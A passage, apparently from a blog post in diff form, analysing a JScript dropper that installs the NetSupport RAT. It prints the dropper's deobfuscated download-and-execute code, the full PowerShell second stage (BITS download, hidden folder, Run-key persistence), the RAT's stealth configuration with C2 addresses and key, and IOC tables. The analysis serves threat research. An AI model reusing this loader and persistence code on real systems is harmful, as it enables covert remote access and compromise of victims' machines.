+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">microsoftStatus</span> <span class="o">!==</span> <span class="mh">0xc8</span> <span class="o">|</span> <span class="nx">twitterStatus</span> <span class="o">!==</span> <span class="mh">0xc8</span> <span class="o">|</span> <span class="nx">facebookStatus</span> <span class="o">!==</span> <span class="mh">0xc8</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// If the status code of the checkURL != 200: Exit script
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">WScript</span><span class="p">[</span><span class="nx">sP</span><span class="p">(</span><span class="mh">0x29c</span><span class="p">,</span> <span class="s1">&#39;0pAi&#39;</span><span class="p">)]();</span> <span class="c1">// WScript[&#34;Quit&#34;]()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">WScript</span><span class="p">[</span><span class="nx">sl</span><span class="p">(</span><span class="mh">0x29d</span><span class="p">,</span> <span class="s1">&#39;%CB$&#39;</span><span class="p">)](</span><span class="mh">0x1388</span><span class="p">);</span> <span class="c1">// WScript[&#34;Sleep&#34;](5000)
+</span></span></span></code></pre></div><h5 id="downloading-second-stage-payload">Downloading Second Stage Payload</h5>
+<p>After resuming from sleep, the script proceeds to build a file path using a randomly generated file name in the format &lsquo;xxxxxxx.ps1&rsquo;, along with the file path to %APPDATA% obtained via the &lsquo;ExpandEnvironmentStrings&rsquo; function of the &lsquo;WScript.Shell&rsquo; object.</p>
+<p>The URL hosting the second stage payload is generated as a base64 string by the &lsquo;G()&rsquo; function and subsequently decoded. As of the time of writing, visiting that URL leads to a web page where the contents of the PowerShell script are stored as a string on the page.</p>
+<p><img src="/secondstage-ps1.png" alt="Powershell Script Hosting"></p>
+<p>This string is retrieved and stored in a variable using a new instance of the &lsquo;MSXML2.ServerXMLHTTP&rsquo; ActiveXObject. Although a file path is constructed, there is no attempt to save a file. Instead, the code is stored in this variable and executed directly using PowerShell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">savePath</span> <span class="o">=</span> <span class="nx">WScript</span><span class="p">[</span><span class="nx">sl</span><span class="p">(</span><span class="mh">0x29e</span><span class="p">,</span> <span class="s1">&#39;af20&#39;</span><span class="p">)](</span><span class="nx">sh</span><span class="p">(</span><span class="mh">0x29f</span><span class="p">,</span> <span class="s1">&#39;0pAi&#39;</span><span class="p">))[</span><span class="nx">sL</span><span class="p">(</span><span class="mh">0x2a0</span><span class="p">,</span> <span class="s1">&#39;*le&amp;&#39;</span><span class="p">)](</span><span class="nx">sl</span><span class="p">(</span><span class="mh">0x2a1</span><span class="p">,</span> <span class="s1">&#39;sh1f&#39;</span><span class="p">))</span> <span class="o">+</span> <span class="s1">&#39;\x5c&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// var savePath = WScript[&#34;CreateObject&#34;](&#34;WScript.Shell&#34;)[&#34;ExpandEnvironmentStrings&#34;](&#34;%APPDATA%&#34;) + &#34;\\&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">fso</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="nx">sX</span><span class="p">(</span><span class="mh">0x2a2</span><span class="p">,</span> <span class="s1">&#39;tc&amp;b&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// var fso = new ActiveXObject(&#34;Scripting.FileSystemObject&#34;); 
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Generates a random file e.g. 9ub5rns.ps1 by generating a random number, converting to a base36 string and slicing first 7 characters.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">randomFileName</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">[</span><span class="s1">&#39;random&#39;</span><span class="p">]()[</span><span class="nx">sE</span><span class="p">(</span><span class="mh">0x2a3</span><span class="p">,</span> <span class="s1">&#39;b]Bm&#39;</span><span class="p">)](</span><span class="mh">0x24</span><span class="p">)[</span><span class="s1">&#39;substring&#39;</span><span class="p">](</span><span class="mh">0x7</span><span class="p">)</span> <span class="o">+</span> <span class="nx">sh</span><span class="p">(</span><span class="mh">0x2a4</span><span class="p">,</span> <span class="s1">&#39;r5a^&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// var fso = Math[&#39;random&#39;]()[&#39;toString&#39;](36)[&#39;substring&#39;](7) + &#39;.ps1&#39;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">scriptUrlBase64</span> <span class="o">=</span> <span class="nx">sP</span><span class="p">(</span><span class="nx">ox2a5</span><span class="p">,</span> <span class="s1">&#39;kVNX&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// var scriptUrlBase64 = &#34;aHR0cHM6Ly93d3cuc25hcHB5c2hvcC5pdC9pbWcvZG9jc2UucGhw&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">scriptUrl</span> <span class="o">=</span> <span class="nx">base64Decode</span><span class="p">(</span><span class="nx">scriptURLBase64</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// var scriptUrl = &#34;hxxps://snappyshow[.]it/img/docse[.]php&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">httpRequest</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="nx">sE</span><span class="p">(</span><span class="mh">0x2a6</span><span class="p">,</span> <span class="s1">&#39;v26k&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// var httpRequest = new ActiveXObject(&#34;MSXML2.ServerXMLHTTP&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">httpRequest</span><span class="p">[</span><span class="nx">sc</span><span class="p">(</span><span class="mh">0x2a7</span><span class="p">,</span> <span class="s1">&#39;OYCl&#39;</span><span class="p">)](</span><span class="nx">sA</span><span class="p">(</span><span class="mh">0x2a8</span><span class="p">,</span> <span class="s1">&#39;[]$G&#39;</span><span class="p">),</span> <span class="nx">scriptUrl</span><span class="p">,</span> <span class="o">!</span><span class="p">[]);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// httpRequest[&#34;open&#34;](&#34;GET&#34;, scriptUrl, false);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">httpRequest</span><span class="p">[</span><span class="nx">sX</span><span class="p">(</span><span class="mh">0x2a9</span><span class="p">,</span> <span class="s1">&#39;w9^7&#39;</span><span class="p">)]();</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// httpRequest[&#34;send&#34;]():
+</span></span></span></code></pre></div><h5 id="executing-the-second-stage-payload">Executing the Second Stage Payload</h5>
+<p>Lastly, the content of the web page containing the PowerShell script is extracted from the &lsquo;httpRequest&rsquo; response object, which was stored earlier. This extracted content is then passed as an argument to execute with &lsquo;powershell.exe&rsquo;.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">scriptCode</span> <span class="o">=</span> <span class="nx">httpRequest</span><span class="p">[</span><span class="nx">sa</span><span class="p">(</span><span class="mh">0x2aa</span><span class="p">,</span> <span class="s1">&#39;%13I&#39;</span><span class="p">)];</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// var scriptCode = httpRequest[&#34;responseText&#34;];
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">shell</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="nx">sE</span><span class="p">(</span><span class="mh">0x2ab</span><span class="p">,</span> <span class="s1">&#39;*le&amp;&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// var shell = new ActiveXObject(&#34;WScript.Shell&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">command</span> <span class="o">=</span> <span class="nx">sa</span><span class="p">(</span><span class="mh">0x2ac</span><span class="p">,</span> <span class="s1">&#39;Qank&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;ers&#39;</span> <span class="o">+</span> <span class="nx">sT</span><span class="p">(</span><span class="mh">0x2ad</span><span class="p">,</span> <span class="s1">&#39;qPz!&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="nx">sX</span><span class="p">(</span><span class="mh">0x2ae</span><span class="p">,</span> <span class="s1">&#39;V26K&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="nx">sT</span><span class="p">(</span><span class="mh">0x2af</span><span class="p">,</span> <span class="s1">&#39;qPz!&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;xe&#39;</span> <span class="o">+</span> <span class="s1">&#39;cu&#39;</span> <span class="o">+</span> <span class="nx">sR</span><span class="p">(</span><span class="mh">0x2b0</span><span class="p">,</span> <span class="s1">&#39;pt]#&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="nx">sL</span><span class="p">(</span><span class="mh">0x2b1</span><span class="p">,</span> <span class="s1">&#39;Dn6B&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="nx">sa</span><span class="p">(</span><span class="mh">0x2b2</span><span class="p">,</span> <span class="s1">&#39;K(%#&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="nx">sc</span><span class="p">(</span><span class="mh">0x2b3</span><span class="p">,</span> <span class="s1">&#39;Mt@d&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;om&#39;</span> <span class="o">+</span> <span class="nx">sl</span><span class="p">(</span><span class="mh">0x2b4</span><span class="p">,</span> <span class="s1">&#39;%CB$&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;\x22&#39;</span> <span class="o">+</span> <span class="nx">scriptCode</span> <span class="o">+</span> <span class="s1">&#39;\x22&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// var command = powershell.exe -ExecutionPolicy Bypass -Command scriptCode
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">shell</span><span class="p">[</span><span class="nx">sA</span><span class="p">(</span><span class="mh">0x2b5</span><span class="p">,</span> <span class="s1">&#39;#FP7&#39;</span><span class="p">)](</span><span class="nx">command</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="o">!!</span><span class="p">[]);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// shell[&#34;Run&#34;](command, 0 ,false);
+</span></span></span></code></pre></div><h2 id="second-stage-payload">Second Stage Payload</h2>
+<p>At the end of the previous step, the malware executes a PowerShell script as its second stage payload. This script lacks significant obfuscation and can be viewed in its entirety below. Its primary objective is to download a zip file containing the final NetSupport payload and establish a persistent method for executing this payload.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">cd </span><span class="nv">$env:Appdata</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$linok</span> <span class="p">=</span> <span class="s1">&#39;hxxps://www[.]snappyshop[.]it/img/index[.]pnp&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$rnums</span><span class="p">=</span><span class="nb">Get-Random</span> <span class="n">-minimum</span> <span class="mf">5</span> <span class="n">-maximum</span> <span class="mf">9</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$r_rnum</span><span class="p">=</span><span class="nb">Get-Random</span> <span class="n">-minimum</span> <span class="mf">1051</span> <span class="n">-maximum</span> <span class="mf">8989</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$chrs</span><span class="p">=</span><span class="s1">&#39;abcdefgjklmntuvwxyzABCDEFGHILMNOTUWXYZ1256890&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$r_strng</span><span class="p">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$ran</span><span class="p">=</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Random</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="p">=</span><span class="mf">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">-lt</span> <span class="nv">$rnums</span><span class="p">;</span> <span class="nv">$i</span><span class="p">++)</span> <span class="p">{</span><span class="nv">$r_strng</span><span class="p">+=</span><span class="nv">$chrs</span><span class="p">[</span><span class="nv">$ran</span><span class="p">.</span><span class="py">next</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span> <span class="nv">$chrs</span><span class="p">.</span><span class="n">Length</span><span class="p">)]};</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$rzip</span><span class="p">=</span><span class="nv">$r_strng</span><span class="p">+</span><span class="s1">&#39;.zip&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$path</span><span class="p">=</span><span class="nv">$env:APPDATA</span><span class="p">+</span><span class="s1">&#39;\&#39;</span><span class="p">+</span><span class="nv">$rzip</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$pezip_</span><span class="p">=</span><span class="nv">$env:APPDATA</span><span class="p">+</span><span class="s1">&#39;\ClockUTCSync_&#39;</span><span class="p">+</span><span class="nv">$r_rnum</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nb">Start-BitsTransfer</span> <span class="n">-Source</span> <span class="nv">$linok</span> <span class="n">-Destination</span> <span class="nv">$Path</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nb">expand-archive</span> <span class="n">-path</span> <span class="nv">$path</span> <span class="n">-destinationpath</span> <span class="nv">$pezip_</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$FOLD</span><span class="p">=</span><span class="nb">Get-Item</span> <span class="nv">$pezip_</span> <span class="n">-Force</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$FOLD</span><span class="p">.</span><span class="n">attributes</span><span class="p">=</span><span class="s1">&#39;Hidden&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nb">Remove-Item</span> <span class="n">-path</span> <span class="nv">$path</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nb">cd </span><span class="nv">$pezip_</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nb">start </span><span class="n">client32</span><span class="p">.</span><span class="n">exe</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$fstrng</span><span class="p">=</span><span class="nv">$pezip_</span><span class="p">+</span><span class="s1">&#39;\client32.exe&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ranome</span><span class="p">=</span><span class="s1">&#39;ClockUTCSync_&#39;</span><span class="p">+</span><span class="nv">$r_rnum</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="s1">&#39;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#39;</span> <span class="n">-Name</span> <span class="nv">$ranome</span> <span class="n">-Value</span> <span class="nv">$fstrng</span> <span class="n">-PropertyType</span> <span class="s1">&#39;String&#39;</span><span class="p">;</span> 
+</span></span></code></pre></div><h3 id="dynamically-generating-file-paths">Dynamically Generating File Paths</h3>
+<p>The malware utilizes the &lsquo;Get-Random&rsquo; function and a character string to dynamically generate file names and paths for storing the downloaded data. Specifically, it generates a variable named &lsquo;$path&rsquo; to represent the file path for the zip download. This path is located within the &lsquo;%APPDATA%&rsquo; directory and incorporates a randomly generated 5-letter file name.</p>
+<pre tabindex="0"><code>C:\Users\Labhost\AppData\Roaming\XXXXX.zip
+</code></pre><p>Additionally, the malware generates a path to store the extracted contents of the zip file, assigning it to the variable &lsquo;$pezip_&rsquo;. This path resides within the &lsquo;%APPDATA%&rsquo; directory, specifically in a folder named &lsquo;ClockUTCSync_XXXX&rsquo;, where XXXX represents a randomly generated 4-digit number between 1051 and 8989
+.</p>
+<pre tabindex="0"><code>C:\Users\Labhost\AppData\Roaming\ClockUTCSync_XXXX\
+</code></pre><h3 id="fetching-final-payload">Fetching Final Payload</h3>
+<p>Once the variables are generated, the script utilizes the &lsquo;Start-BitsTransfer&rsquo; cmdlet to initiate the download of the zip file from the specified attacker controller URL, which was defined at the beginning of the script. The downloaded zip file is saved to the previously generated &lsquo;$path&rsquo; location.</p>
+<p>Subsequently, the script extracts the contents of the downloaded ZIP file into the designated &lsquo;$pezip_&rsquo; location. The extracted files within the folder are then marked as hidden to conceal their presence on the filesystem. Finally, the script removes the original ZIP file from the &lsquo;%APPDATA%&rsquo; diectory.</p>
+<h3 id="establishing-persistence">Establishing Persistence</h3>
+<p>After the extraction, the script proceeds to execute the main NetSupport installer, which is named &lsquo;Client32.exe&rsquo; in this instance. To establish persistence, a &lsquo;Run&rsquo; registry key entry is created, with the name &lsquo;ClockUTCSync_XXXX&rsquo; (reusing the name from earlier), pointing to the &lsquo;Client32.exe&rsquo; executable.</p>
+<pre tabindex="0"><code>HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ClockUTCSync_XXXX = &#34;C:\Users\Labhost\AppData\Roaming\ClockUTCSync_XXXX\Client32.exe&#34;
+</code></pre><p><img src="/secondstage-persistence.png" alt="Establishing Persistence"></p>
+<h2 id="netsupport-rat---client32exe">NetSupport RAT - Client32.exe</h2>
+<p>Inside the extracted zip file you will find an older version of the NetSupport Client binary, specifically from 2013 (V12.0.0.1000). This binary is digitally signed with the official NetSupport signature. The extracted ZIP archive includes several DLL files. Some of these DLLs are associated with the NetSupport Client, while others are legitimate Microsoft DLLs.</p>
+<p><img src="/zip-contents.png" alt="Zip File Contents"></p>
+<h3 id="netsupport-config-file">NetSupport Config File</h3>
+<p>Inspecting the &lsquo;Client32.ini&rsquo; file, you can see the configuration data utilized by the NetSupport client. This file contains numerous options aimed at concealing the client&rsquo;s presence on the victim&rsquo;s machine. These tactics include hiding the system tray icon, disabling certain GUI menus that are typically available in the client, and enabling the client to start on bootup, ensuring persistence across system restarts.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="cl"><span class="p">[</span><span class="l">Client]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">_present=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">AlwaysOnTop=0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">AutoICFConfig=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">DisableChat=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">DisableChatMenu=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">DisableClientConnect=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">DisableCloseApps=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">DisableDisconnect=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">DisableLocalInventory=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">DisableManageServices=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">DisableMessage=1</span><span class="w">
+</span></span></span></code></pre></div><p>The &lsquo;[HTTP]&rsquo; section reveals crucial information about the RAT client&rsquo;s communication. Within this section, you can find the domain to which the client is configured to connect for receiving commands. Additionally, the configuration exposes the Gateway security key used in the authentication process.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="cl"><span class="p">[</span><span class="l">HTTP]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">CMPI=60</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">GatewayAddress=balibumba1[.]com:5222</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">GSK=GK&lt;PBBGF&lt;KAMGA;B?MBNEPHA</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">Port=5222</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">SecondaryGateway=balibumba2[.]com:5222</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">SecondaryPort=5222</span><span class="w">
+</span></span></span></code></pre></div><p>The &lsquo;balibumba1[.]com&rsquo; domain was registered recently (28th May 2023).</p>
+<img src="/balibumba1-domain.png"  width="600" height="400">
+<p>At the time of writing, this domain points to an IP address hosted by the ISP &lsquo;Prospero OOO&rsquo; based in Russia.</p>
+<img src="/ip-lookup.png"  width="280" height="300">
+<p>When routing the traffic to a netcat listener, you can observe the typical indicators associated with a NetSupport client. The URL of the post request (hxxp://XX.XX.XX/fakeurl[.]htm) and the user agent string (NetSupport Manager/1.3) are consistent with the characteristics of the NetSupport client. After the initial packet, which contained information about the host, the client continuously polled the NetSupport Manager Gateway for instructions.</p>
+<img src="/client32-exe-netcat-listen.png"  width="450" height="500">
+<p>You can see the full contents of the config file below.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="cl"><span class="m">0x1269ce73</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="l">Client]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">_present=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">AlwaysOnTop=0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">AutoICFConfig=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">DisableChat=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">DisableChatMenu=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">DisableClientConnect=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">DisableCloseApps=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">DisableDisconnect=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">DisableLocalInventory=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">DisableManageServices=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">DisableMessage=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">DisableReplayMenu=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">DisableRequestHelp=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">HideWhenIdle=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">Protocols=3</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">RoomSpec=Eval</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">Shared=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">silent=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">SOS_Alt=0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">SOS_LShift=0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">SOS_RShift=0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">SysTray=0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">UnloadMirrorOnDisconnect=0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">Usernames=*</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">ValidAddresses.TCP=*</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="l">_Info]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">Filename=C:\Program Files\NetSupport\NetSupport Manager\client32.ini</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="l">_License]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">quiet=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="l">Audio]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">DisableAudioFilter=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">Threshold=48</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="l">Bridge]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">LoadOnStartup=1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">Modem=PPTP</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">PasswordFile=C:\Program Files\NetSupport\NetSupport Manager\bridge.psw</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">Protocol=0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="l">General]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">BeepUsingSpeaker=0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="l">HTTP]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">CMPI=60</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">GatewayAddress=balibumba1.com:5222</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">GSK=GK&lt;PBBGF&lt;KAMGA;B?MBNEPHA</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">Port=5222</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">SecondaryGateway=balibumba2.com:5222</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">SecondaryPort=5222</span><span class="w">
+</span></span></span></code></pre></div><h2 id="indicators-of-compromise-iocs">Indicators of Compromise (IOC&rsquo;s)</h2>
+<h3 id="network-indicators">Network Indicators</h3>
+<h4 id="contacted-domains">Contacted Domains</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Domain</th>
+<th style="text-align:left">IP</th>
+<th style="text-align:left">Port</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">www[.]snappyshop[.]it</td>
+<td style="text-align:left">161[.]97[.]125[.]17</td>
+<td style="text-align:left">80,443</td>
+</tr>
+<tr>
+<td style="text-align:left">balibumba1[.]com</td>
+<td style="text-align:left">91[.]215[.]85[.]180</td>
+<td style="text-align:left">5222</td>
+</tr>
+<tr>
+<td style="text-align:left">balibumba2[.]com</td>
+<td style="text-align:left">-</td>
+<td style="text-align:left">5222</td>
+</tr>
+</tbody>
+</table>
+<h4 id="file-download-urls">File Download URL&rsquo;s</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">URL&rsquo;s</th>
+<th style="text-align:left">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">hxxps://www[.]snappyshop[.]it/img/docse[.]php</td>
+<td style="text-align:left">Download URL for second stage Powershell script.</td>
+</tr>
+<tr>
+<td style="text-align:left">hxxps://www[.]snappyshop[.]it/img/index[.]php</td>
+<td style="text-align:left">Download for final stage ZIP file</td>
+</tr>
+</tbody>
+</table>
+<h3 id="host-indicators">Host Indicators</h3>
+<h4 id="file-hashes">File Hashes</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Script</th>
+<th style="text-align:left">SHA256</th>
+<th style="text-align:left">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">scan129.js</td>
+<td style="text-align:left">759e159da0592063bb0eb967dd45802caa0a1538867994868d5b883f099286a5</td>
+<td style="text-align:left">Initial Dropper</td>
+</tr>
+<tr>
+<td style="text-align:left">XXXXXXX.ps1</td>
+<td style="text-align:left">d4e2c1c44b57be6b3467301f162fd65ff89f2a02407ecd95c7a97e3b2b622a57</td>
+<td style="text-align:left">Second stage PS Script</td>
+</tr>
+<tr>
+<td style="text-align:left">XXXXX.zip</td>
+<td style="text-align:left">18fd1a93e711c0d8eda1a269fea54f238781f0e67e1570d21308f4f47cd2ba63</td>
+<td style="text-align:left">Download ZIP File</td>
+</tr>
+<tr>
+<td style="text-align:left">AudioCapture.dll</td>
